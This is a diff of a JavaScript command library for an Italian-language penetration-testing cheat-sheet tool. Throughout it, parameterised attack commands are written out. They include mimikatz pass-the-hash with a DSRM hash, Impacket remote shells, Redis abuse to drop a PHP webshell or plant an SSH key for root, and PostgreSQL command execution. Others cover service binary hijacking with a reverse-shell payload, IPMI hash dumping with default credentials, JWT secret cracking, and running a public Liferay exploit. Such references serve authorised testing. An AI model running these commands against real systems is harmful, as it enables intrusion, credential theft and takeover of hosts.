+    "template": "# abilita il logon di rete per l'account DSRM\nNew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD\n\n# pass-the-hash con l'hash DSRM, apre una PowerShell\n.\\mimikatz.exe \"sekurlsa::pth /domain:<dchost> /user:Administrator /ntlm:<dsrmhash> /run:powershell.exe\" \"exit\"",
     "params": [
       {
         "key": "dchost",
@@ -11317,7 +11548,7 @@ const COMMANDS = [
   },
   {
     "id": "psexec",
-    "name": "psexec.py — shell SYSTEM",
+    "name": "impacket-psexec — shell SYSTEM",
     "category": "lateral",
     "subcategory": "remote-shells",
     "group": "Impacket Shells",
@@ -11334,7 +11565,7 @@ const COMMANDS = [
       "impacket",
       "psexec"
     ],
-    "template": "psexec.py <domain>/<user>:<password>@<ip>",
+    "template": "impacket-psexec <domain>/<user>:<password>@<ip>",
     "params": [
       {
         "key": "domain",
@@ -11371,20 +11602,20 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Password",
-        "template": "psexec.py <domain>/<user>:<password>@<ip>",
+        "template": "impacket-psexec <domain>/<user>:<password>@<ip>",
         "description": "Auth con password."
       },
       {
         "id": "hash",
         "label": "Pass-the-Hash",
-        "template": "psexec.py <domain>/<user>@<ip> -hashes :<hash>",
+        "template": "impacket-psexec <domain>/<user>@<ip> -hashes :<hash>",
         "description": "Pass-the-Hash con NTLM (solo la parte NT, dopo i due punti)."
       }
     ]
   },
   {
     "id": "wmiexec",
-    "name": "wmiexec.py — semi-interattiva",
+    "name": "impacket-wmiexec — semi-interattiva",
     "category": "lateral",
     "subcategory": "remote-shells",
     "group": "Impacket Shells",
@@ -11403,7 +11634,7 @@ const COMMANDS = [
       "impacket",
       "wmiexec"
     ],
-    "template": "wmiexec.py <domain>/<user>:<password>@<ip>",
+    "template": "impacket-wmiexec <domain>/<user>:<password>@<ip>",
     "params": [
       {
         "key": "domain",
@@ -11440,26 +11671,26 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Password",
-        "template": "wmiexec.py <domain>/<user>:<password>@<ip>",
+        "template": "impacket-wmiexec <domain>/<user>:<password>@<ip>",
         "description": "Auth con password."
       },
       {
         "id": "hash",
         "label": "Pass-the-Hash",
-        "template": "wmiexec.py <domain>/<user>@<ip> -hashes :<hash>",
+        "template": "impacket-wmiexec <domain>/<user>@<ip> -hashes :<hash>",
         "description": "Pass-the-Hash."
       },
       {
         "id": "kerberos",
         "label": "Kerberos",
-        "template": "wmiexec.py <domain>/<user>@<ip> -k -no-pass",
+        "template": "impacket-wmiexec <domain>/<user>@<ip> -k -no-pass",
         "description": "Usa il ticket in `KRB5CCNAME` (Pass-the-Ticket)."
       }
     ]
   },
   {
     "id": "smbexec",
-    "name": "smbexec.py — shell via share",
+    "name": "impacket-smbexec — shell via share",
     "category": "lateral",
     "subcategory": "remote-shells",
     "group": "Impacket Shells",
@@ -11476,7 +11707,7 @@ const COMMANDS = [
       "impacket",
       "smbexec"
     ],
-    "template": "smbexec.py <domain>/<user>:<password>@<ip>",
+    "template": "impacket-smbexec <domain>/<user>:<password>@<ip>",
     "params": [
       {
         "key": "domain",
@@ -11506,7 +11737,7 @@ const COMMANDS = [
   },
   {
     "id": "dcomexec",
-    "name": "dcomexec.py — via DCOM",
+    "name": "impacket-dcomexec — via DCOM",
     "category": "lateral",
     "subcategory": "remote-shells",
     "group": "Impacket Shells",
@@ -11525,7 +11756,7 @@ const COMMANDS = [
       "dcomexec",
       "dcom"
     ],
-    "template": "dcomexec.py <domain>/<user>:<password>@<ip>",
+    "template": "impacket-dcomexec <domain>/<user>:<password>@<ip>",
     "params": [
       {
         "key": "domain",
@@ -11562,26 +11793,26 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "MMC20",
-        "template": "dcomexec.py <domain>/<user>:<password>@<ip> -object MMC20",
+        "template": "impacket-dcomexec <domain>/<user>:<password>@<ip> -object MMC20",
         "description": "Oggetto DCOM `MMC20` (default)."
       },
       {
         "id": "shellwindows",
         "label": "ShellWindows",
-        "template": "dcomexec.py <domain>/<user>:<password>@<ip> -object ShellWindows",
+        "template": "impacket-dcomexec <domain>/<user>:<password>@<ip> -object ShellWindows",
         "description": "Alternativa se `MMC20` è bloccato."
       },
       {
         "id": "hash",
         "label": "Pass-the-Hash",
-        "template": "dcomexec.py <domain>/<user>@<ip> -hashes :<hash>",
+        "template": "impacket-dcomexec <domain>/<user>@<ip> -hashes :<hash>",
         "description": "Pass-the-Hash."
       }
     ]
   },
   {
     "id": "atexec",
-    "name": "atexec.py — via scheduled task",
+    "name": "impacket-atexec — via scheduled task",
     "category": "lateral",
     "subcategory": "remote-shells",
     "group": "Impacket Shells",
@@ -11598,7 +11829,7 @@ const COMMANDS = [
       "impacket",
       "atexec"
     ],
-    "template": "atexec.py <domain>/<user>:<password>@<ip> 'whoami'",
+    "template": "impacket-atexec <domain>/<user>:<password>@<ip> 'whoami'",
     "params": [
       {
         "key": "domain",
@@ -11777,7 +12008,7 @@ const COMMANDS = [
       "ptt",
       "kerberos"
     ],
-    "template": "export KRB5CCNAME=ticket.ccache; psexec.py <domain>/<user>@<target> -k -no-pass",
+    "template": "export KRB5CCNAME=ticket.ccache; impacket-psexec <domain>/<user>@<target> -k -no-pass",
     "params": [
       {
         "key": "domain",
@@ -11817,7 +12048,7 @@ const COMMANDS = [
       "overpass-the-hash",
       "getTGT"
     ],
-    "template": "getTGT.py <domain>/<user> -hashes :<hash>",
+    "template": "impacket-getTGT <domain>/<user> -hashes :<hash>",
     "params": [
       {
         "key": "domain",
@@ -11842,7 +12073,7 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Linux (getTGT)",
-        "template": "getTGT.py <domain>/<user> -hashes :<hash>",
+        "template": "impacket-getTGT <domain>/<user> -hashes :<hash>",
         "description": "Salva un `.ccache`; poi `export KRB5CCNAME=...`."
       },
       {
@@ -12470,7 +12701,7 @@ const COMMANDS = [
       {
         "id": "keys",
         "label": "Chiavi & valori",
-        "template": "redis-cli -h <ip> KEYS '*'\nredis-cli -h <ip> GET <key>",
+        "template": "# elenca tutte le chiavi presenti sull'istanza\nredis-cli -h <ip> KEYS '*'\n\n# legge il valore della chiave scelta\nredis-cli -h <ip> GET <key>",
         "description": "Elenca tutte le chiavi e ne legge una. Cerca sessioni, credenziali applicative e configurazioni salvate in cache."
       },
       {
@@ -12490,9 +12721,9 @@ const COMMANDS = [
   {
     "id": "redis-rce",
     "name": "Redis — RCE via CONFIG SET",
-    "category": "service-enum",
-    "subcategory": "redis",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "Redis (6379)",
     "description": "Se Redis è aperto e il processo può scrivere sul filesystem, `CONFIG SET dir` più `dbfilename` reindirizzano il file di dump dove serve: si scrive una webshell nel web root o una chiave pubblica in `authorized_keys` per una shell SSH. Il salvataggio effettivo avviene con `SAVE`.",
     "platform": "linux",
     "requires": [
@@ -12506,7 +12737,7 @@ const COMMANDS = [
       "rce",
       "webshell"
     ],
-    "template": "redis-cli -h <ip> config set dir /var/www/html\nredis-cli -h <ip> config set dbfilename shell.php\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\nredis-cli -h <ip> save",
+    "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
     "params": [
       {
         "key": "ip",
@@ -12519,13 +12750,13 @@ const COMMANDS = [
       {
         "id": "webshell",
         "label": "Webshell (web root)",
-        "template": "redis-cli -h <ip> config set dir /var/www/html\nredis-cli -h <ip> config set dbfilename shell.php\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\nredis-cli -h <ip> save",
+        "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
         "description": "Scrive `shell.php` nel web root: la RCE parte da `http://<ip>/shell.php?c=id`. Serve conoscere un path servito da un web server e scrivibile dal processo redis."
       },
       {
         "id": "sshkey",
         "label": "Chiave SSH",
-        "template": "ssh-keygen -t rsa -f ./key -q -N ''\n(echo; cat key.pub; echo) > key.txt\nredis-cli -h <ip> flushall\ncat key.txt | redis-cli -h <ip> -x set sshkey\nredis-cli -h <ip> config set dir /root/.ssh\nredis-cli -h <ip> config set dbfilename authorized_keys\nredis-cli -h <ip> save\nssh -i key root@<ip>",
+        "template": "# genera una coppia di chiavi SSH senza passphrase\nssh-keygen -t rsa -f ./key -q -N ''\n\n# imbottisce la chiave pubblica di newline, per non corrompere il file finale\n(echo; cat key.pub; echo) > key.txt\n\n# svuota il database, così il dump contiene solo la chiave\nredis-cli -h <ip> flushall\n\n# carica la chiave pubblica dentro una chiave Redis\ncat key.txt | redis-cli -h <ip> -x set sshkey\n\n# sposta la directory di dump in /root/.ssh\nredis-cli -h <ip> config set dir /root/.ssh\n\n# chiama il dump authorized_keys\nredis-cli -h <ip> config set dbfilename authorized_keys\n\n# salva: la chiave finisce tra le authorized_keys di root\nredis-cli -h <ip> save\n\n# entra via SSH come root con la chiave privata\nssh -i key root@<ip>",
         "description": "Scrive la propria chiave pubblica in `/root/.ssh/authorized_keys` (o nella home di un altro utente) per una shell SSH. Funziona se il processo redis gira come quell'utente e la dir esiste."
       }
     ]
@@ -12581,7 +12812,7 @@ const COMMANDS = [
       {
         "id": "enum",
         "label": "Database & ruoli",
-        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\l'\nPGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\du'",
+        "template": "# elenca i database dell'istanza\nPGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\l'\n\n# elenca ruoli e privilegi\nPGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\du'",
         "description": "Elenca database e ruoli in modo non interattivo. Un ruolo `Superuser` = lettura file e RCE possibili."
       },
       {
@@ -12601,9 +12832,9 @@ const COMMANDS = [
   {
     "id": "psql-rce",
     "name": "PostgreSQL — RCE & lettura file",
-    "category": "service-enum",
-    "subcategory": "postgresql",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "PostgreSQL (5432)",
     "description": "Con un ruolo Superuser, PostgreSQL esegue comandi di sistema tramite `COPY ... FROM PROGRAM` (dalla 9.3) e legge file arbitrari copiandoli in una tabella. L'output del comando finisce in una tabella temporanea che poi si interroga.",
     "platform": "linux",
     "requires": [
@@ -12702,7 +12933,7 @@ const COMMANDS = [
       {
         "id": "collections",
         "label": "Collezioni & dump",
-        "template": "mongosh --host <ip>/<db> --quiet --eval 'db.getCollectionNames()'\nmongosh --host <ip>/<db> --quiet --eval 'db.<coll>.find().pretty()'",
+        "template": "# elenca le collection del database\nmongosh --host <ip>/<db> --quiet --eval 'db.getCollectionNames()'\n\n# stampa i documenti della collection scelta\nmongosh --host <ip>/<db> --quiet --eval 'db.<coll>.find().pretty()'",
         "description": "Elenca le collezioni di un database e dumpa i documenti di una di esse. Cerca la collezione `users` per credenziali."
       }
     ]
@@ -12758,7 +12989,7 @@ const COMMANDS = [
       {
         "id": "health",
         "label": "Cluster & versione",
-        "template": "curl -s 'http://<ip>:9200/'\ncurl -s 'http://<ip>:9200/_cluster/health?pretty'",
+        "template": "# banner del nodo: versione e nome del cluster\ncurl -s 'http://<ip>:9200/'\n\n# stato di salute del cluster\ncurl -s 'http://<ip>:9200/_cluster/health?pretty'",
         "description": "Legge versione (per cercare CVE, es. RCE su vecchie release) e stato del cluster."
       }
     ]
@@ -12805,13 +13036,13 @@ const COMMANDS = [
       {
         "id": "stats",
         "label": "Stats",
-        "template": "memcstat --servers=<ip>\n# oppure senza libmemcached:\necho -e 'stats\\r' | nc -q1 <ip> 11211",
+        "template": "# statistiche del server tramite client libmemcached\nmemcstat --servers=<ip>\n\n# stesse statistiche senza libmemcached, parlando il protocollo a mano\necho -e 'stats\\r' | nc -q1 <ip> 11211",
         "description": "Panoramica del server: numero di elementi in cache e uptime. Conferma che risponde senza auth."
       },
       {
         "id": "keys",
         "label": "Chiavi & valori",
-        "template": "echo -e 'stats items\\r' | nc -q1 <ip> 11211\necho -e 'stats cachedump <slab> 100\\r' | nc -q1 <ip> 11211\necho -e 'get <key>\\r' | nc -q1 <ip> 11211",
+        "template": "# elenca gli slab con le chiavi memorizzate\necho -e 'stats items\\r' | nc -q1 <ip> 11211\n\n# dump delle chiavi di uno slab\necho -e 'stats cachedump <slab> 100\\r' | nc -q1 <ip> 11211\n\n# legge il valore della chiave scelta\necho -e 'get <key>\\r' | nc -q1 <ip> 11211",
         "description": "Elenca gli slab, ne dumpa le chiavi e legge un valore. Cerca chiavi con nomi tipo `session` o `user`."
       }
     ]
@@ -12819,9 +13050,9 @@ const COMMANDS = [
   {
     "id": "ipmi-dumphash",
     "name": "IPMI — dump & crack hash",
-    "category": "service-enum",
-    "subcategory": "ipmi",
-    "group": "Exploitation",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "IPMI (623/udp)",
     "description": "IPMI 2.0 ha una falla di progetto nel protocollo RAKP: il BMC restituisce un hash della password di qualsiasi utente valido prima dell'autenticazione, quindi si estrae offline. Alcuni BMC accettano anche Cipher 0, che bypassa del tutto l'autenticazione. Gli hash si crackano con hashcat mode 7300.",
     "note": "# Credenziali di default\nDefault dei BMC per la Cipher 0 / login web: `ADMIN:ADMIN` (Supermicro) · `root:calvin` (Dell iDRAC) · `USERID:PASSW0RD` (IBM/Lenovo, con lo zero) · `Administrator:admin` (HP iLO) · `admin:admin` · `root:root`.",
     "platform": "linux",
@@ -13098,7 +13329,7 @@ const COMMANDS = [
       {
         "id": "decode",
         "label": "Decodifica",
-        "template": "jwt_tool <jwt>\n# oppure a mano:\necho '<jwt>' | cut -d. -f1,2 | tr '.' '\\n' | base64 -d 2>/dev/null",
+        "template": "# decodifica header e payload del token\njwt_tool <jwt>\n\n# stessa decodifica a mano, senza jwt_tool\necho '<jwt>' | cut -d. -f1,2 | tr '.' '\\n' | base64 -d 2>/dev/null",
         "description": "Mostra header e payload in chiaro. Guarda `alg`, i claim di ruolo/utente e la scadenza per capire cosa manomettere."
       },
       {
@@ -13110,7 +13341,7 @@ const COMMANDS = [
       {
         "id": "brute",
         "label": "Brute secret HS256",
-        "template": "jwt_tool <jwt> -C -d <wordlist>\n# oppure hashcat:\nhashcat -m 16500 <jwt> <wordlist>",
+        "template": "# bruteforce del segreto HMAC con jwt_tool\njwt_tool <jwt> -C -d <wordlist>\n\n# stesso bruteforce con hashcat, più veloce su GPU\nhashcat -m 16500 <jwt> <wordlist>",
         "description": "Cerca il segreto HMAC con un dizionario. Trovato il segreto, si rifirma il token con qualsiasi claim."
       },
       {
@@ -13256,7 +13487,7 @@ const COMMANDS = [
       {
         "id": "check",
         "label": "Check esposizione",
-        "template": "curl -s http://<ip>/.git/HEAD\ncurl -s http://<ip>/.git/config",
+        "template": "# verifica se la cartella .git è esposta\ncurl -s http://<ip>/.git/HEAD\n\n# legge la config del repo: remote e branch\ncurl -s http://<ip>/.git/config",
         "description": "Una risposta con `ref: refs/heads/...` conferma che la `.git` è servita e scaricabile. Vale la pena controllare anche `.svn/`, `.hg/` e i backup `.bak`/`.zip`."
       },
       {
@@ -13268,7 +13499,7 @@ const COMMANDS = [
       {
         "id": "secrets",
         "label": "Cerca segreti nella history",
-        "template": "cd ./loot-git && git log --oneline --all\ngit log -p --all | grep -iE 'password|passwd|secret|api[_-]?key|token'",
+        "template": "# storico completo dei commit del repo scaricato\ncd ./loot-git && git log --oneline --all\n\n# cerca credenziali e token nelle diff di tutti i commit\ngit log -p --all | grep -iE 'password|passwd|secret|api[_-]?key|token'",
         "description": "Scorre tutti i commit: le credenziali spesso vengono committate e poi 'rimosse', ma restano nella history. `git show <commit>` apre uno specifico cambiamento."
       }
     ]
@@ -13308,19 +13539,19 @@ const COMMANDS = [
       {
         "id": "enum",
         "label": "Enum servizi scrivibili",
-        "template": ".\\accesschk.exe /accepteula -uwcqv <user> *\n# nativo, senza accesschk:\nGet-CimInstance win32_service | ? {$_.StartName -like '*LocalSystem*'} | select Name,PathName",
+        "template": "# cerca i servizi su cui l'utente ha permessi di modifica\n.\\accesschk.exe /accepteula -uwcqv <user> *\n\n# stessa ricerca senza accesschk, solo con cmdlet nativi\nGet-CimInstance win32_service | ? {$_.StartName -like '*LocalSystem*'} | select Name,PathName",
         "description": "Elenca i servizi su cui l'utente ha permessi di scrittura (`SERVICE_CHANGE_CONFIG`/`WRITE_DAC`). Un servizio modificabile che gira come SYSTEM è la via diretta a SYSTEM."
       },
       {
         "id": "reconfig",
         "label": "Dirotta binPath",
-        "template": "sc config <svc> binPath= \"C:\\Windows\\Temp\\rev.exe\"\nsc stop <svc>\nsc start <svc>",
+        "template": "# riscrive il binario del servizio col tuo payload\nsc config <svc> binPath= \"C:\\Windows\\Temp\\rev.exe\"\n\n# ferma il servizio\nsc stop <svc>\n\n# lo riavvia: il payload parte con l'account del servizio\nsc start <svc>",
         "description": "Riscrive l'eseguibile del servizio con il proprio payload, poi lo riavvia per eseguirlo come SYSTEM. Ripristina il binPath originale a fine attività."
       },
       {
         "id": "binexe",
         "label": "Sovrascrivi l'eseguibile",
-        "template": "# se hai permesso di scrittura sul .exe del servizio (non serve sc config):\ncopy /Y C:\\Windows\\Temp\\rev.exe \"C:\\Path\\To\\service.exe\"\nsc stop <svc> & sc start <svc>",
+        "template": "# quando hai permesso di scrittura sul .exe del servizio e non serve sc config\n\n# sovrascrive il binario del servizio col payload\ncopy /Y C:\\Windows\\Temp\\rev.exe \"C:\\Path\\To\\service.exe\"\n\n# riavvia il servizio per eseguirlo\nsc stop <svc> & sc start <svc>",
         "description": "Quando è l'eseguibile a essere scrivibile, lo si sostituisce direttamente. Il riavvio del servizio (o un reboot) esegue il payload come SYSTEM."
       }
     ],
@@ -13404,13 +13635,13 @@ const COMMANDS = [
       {
         "id": "enum",
         "label": "Enum autorun",
-        "template": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n# con Sysinternals:\n.\\autorunsc.exe -a * -c -h",
+        "template": "# autorun a livello di macchina\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# autorun dell'utente corrente\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# vista completa con Sysinternals, hash inclusi\n.\\autorunsc.exe -a * -c -h",
         "description": "Elenca i programmi eseguiti all'avvio. Annota il path di ciascun eseguibile per verificarne poi i permessi di scrittura."
       },
       {
         "id": "writable",
         "label": "Check scrivibilità",
-        "template": ".\\accesschk.exe /accepteula -wvu \"C:\\Path\\To\\autorun.exe\"\nicacls \"C:\\Path\\To\\autorun.exe\"",
+        "template": "# verifica se l'utente può scrivere sul binario in autorun\n.\\accesschk.exe /accepteula -wvu \"C:\\Path\\To\\autorun.exe\"\n\n# stessi permessi letti con icacls, senza Sysinternals\nicacls \"C:\\Path\\To\\autorun.exe\"",
         "description": "Verifica se l'eseguibile di autorun è scrivibile dall'utente corrente. Se lo è, si sostituisce con un payload che parte al prossimo login privilegiato."
       }
     ]
@@ -13724,19 +13955,19 @@ const COMMANDS = [
       {
         "id": "version",
         "label": "Versione (CVE-2019-8442)",
-        "template": "curl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version\ncurl -sk 'http://<ip>/rest/api/2/serverInfo'",
+        "template": "# versione dal pom.xml via path traversal pre-auth\ncurl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version\n\n# versione e build dall'endpoint serverInfo\ncurl -sk 'http://<ip>/rest/api/2/serverInfo'",
         "description": "Legge la versione dal pom.xml (path traversal pre-auth CVE-2019-8442) o da `serverInfo`. Da qui si scelgono i CVE applicabili."
       },
       {
         "id": "userenum",
         "label": "Enum utenti",
-        "template": "curl -sk 'http://<ip>/rest/api/latest/groupuserpicker?query=%25&maxResults=50000&showAvatar=true'\ncurl -sk 'http://<ip>/secure/ViewUserHover.jspa?username=admin'\ncurl -sk 'http://<ip>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin'",
+        "template": "# elenca tutti gli utenti via groupuserpicker\ncurl -sk 'http://<ip>/rest/api/latest/groupuserpicker?query=%25&maxResults=50000&showAvatar=true'\n\n# conferma un utente via ViewUserHover\ncurl -sk 'http://<ip>/secure/ViewUserHover.jspa?username=admin'\n\n# enumera utenti senza login via QueryComponentRendererValue\ncurl -sk 'http://<ip>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin'",
         "description": "Enumera tutti gli utenti tramite groupuserpicker (CVE-2019-8449), ViewUserHover (CVE-2020-14181) o QueryComponentRendererValue (CVE-2020-36289, unauth)."
       },
       {
         "id": "infoleak",
         "label": "Filtri, dashboard, progetti",
-        "template": "curl -sk 'http://<ip>/secure/ManageFilters.jspa?filterView=popular'\ncurl -sk 'http://<ip>/rest/api/2/dashboard?maxResults=100'\ncurl -sk 'http://<ip>/secure/QueryComponent!Default.jspa'",
+        "template": "# filtri condivisi pubblicamente\ncurl -sk 'http://<ip>/secure/ManageFilters.jspa?filterView=popular'\n\n# dashboard esposte via API\ncurl -sk 'http://<ip>/rest/api/2/dashboard?maxResults=100'\n\n# campi custom e chiavi progetto\ncurl -sk 'http://<ip>/secure/QueryComponent!Default.jspa'",
         "description": "Filtri e dashboard popolari, campi custom (CVE-2020-14179) e chiavi progetto (`/browse.<KEY>`, CVE-2020-14178) esposti senza login."
       }
     ],
@@ -13857,7 +14088,7 @@ const COMMANDS = [
       "portal",
       "jsonws"
     ],
-    "template": "curl -sk 'http://<ip>/c/portal/license'\ncurl -sk 'http://<ip>/api/jsonws' | head",
+    "template": "# versione e stato della licenza\ncurl -sk 'http://<ip>/c/portal/license'\n\n# elenco dei servizi JSONWS esposti\ncurl -sk 'http://<ip>/api/jsonws' | head",
     "params": [
       {
         "key": "ip",
@@ -13876,7 +14107,7 @@ const COMMANDS = [
       {
         "id": "detect",
         "label": "Fingerprint",
-        "template": "curl -sk 'http://<ip>/c/portal/license'\ncurl -sk -o /dev/null -w '%{http_code}\\n' 'http://<ip>/?p_p_id=com_liferay_login_web_portlet_LoginPortlet'\ncurl -sk 'http://<ip>/o/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}'",
+        "template": "# versione e stato della licenza\ncurl -sk 'http://<ip>/c/portal/license'\n\n# verifica il portlet di login: conferma che è Liferay\ncurl -sk -o /dev/null -w '%{http_code}\\n' 'http://<ip>/?p_p_id=com_liferay_login_web_portlet_LoginPortlet'\n\n# verifica se l'endpoint GraphQL risponde\ncurl -sk 'http://<ip>/o/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}'",
         "description": "Conferma Liferay via licenza, login portlet e GraphQL. La versione indirizza verso i CVE noti (riferimento: liferay.dev)."
       },
       {
@@ -13888,7 +14119,7 @@ const COMMANDS = [
       {
         "id": "controlpanel",
         "label": "Control Panel bypass",
-        "template": "# rotte alternative al Control Panel (provale una a una):\ncurl -sk 'http://<ip>/group/control_panel/manage'\ncurl -sk 'http://<ip>/group/guest/control_panel/manage'\ncurl -sk 'http://<ip>/user/<user>/control_panel/manage'",
+        "template": "# rotte alternative al Control Panel, provale una a una\n\n# rotta standard del Control Panel\ncurl -sk 'http://<ip>/group/control_panel/manage'\n\n# rotta sul sito guest\ncurl -sk 'http://<ip>/group/guest/control_panel/manage'\n\n# rotta personale dell'utente\ncurl -sk 'http://<ip>/user/<user>/control_panel/manage'",
         "description": "Il Control Panel amministrativo è raggiungibile per più rotte: una funzionalità nascosta nel frontend resta accessibile via portlet route. Da qui si arriva alla Script Console Groovy."
       }
     ],
@@ -13923,7 +14154,7 @@ const COMMANDS = [
       "deserialization",
       "groovy"
     ],
-    "template": "# CVE-2020-7961 — deserializzazione JSONWS (Liferay < 7.2.1), usa un PoC pubblico:\ngit clone https://github.com/mzruya/CVE-2020-7961 && cd CVE-2020-7961\npython3 exploit.py http://<ip> '<cmd>'",
+    "template": "# CVE-2020-7961 — deserializzazione JSONWS su Liferay < 7.2.1, via PoC pubblico\n\n# scarica il PoC ed entra nella cartella\ngit clone https://github.com/mzruya/CVE-2020-7961 && cd CVE-2020-7961\n\n# esegue il comando sul target\npython3 exploit.py http://<ip> '<cmd>'",
     "params": [
       {
         "key": "ip",
